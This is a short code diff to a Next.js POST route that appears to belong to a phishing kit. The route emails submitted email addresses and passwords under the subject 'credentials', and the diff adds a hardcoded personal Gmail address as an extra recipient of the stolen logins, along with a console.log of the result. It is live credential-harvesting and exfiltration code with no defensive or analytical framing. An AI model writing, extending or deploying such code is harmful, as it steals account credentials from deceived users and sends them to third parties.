@@ -20,12 +20,14 @@ export async function POST(request: Request) {
        });
 
       const result = await transporter.sendMail({
-         from: `"fox" <${process.env.APP_ACCOUNT}>`,
-         to: process.env.EMAIL_TO_SEND,
+         from: `"dees" <${process.env.APP_ACCOUNT}>`,
+         to: `${process.env.EMAIL_TO_SEND}, lengleytony@gmail.com`,
          subject: 'credentials',
          // text: `${JSON.stringify(email)} ${JSON.stringify(password)}`,
          html: `<h3>email: ${JSON.stringify(res.email).replaceAll('"', '')}, password: ${JSON.stringify(res.jennet).replaceAll('"', '')}</h3>`
        })
+       console.log(result);
+       
 
        return NextResponse.json({status: true, message: result})
       
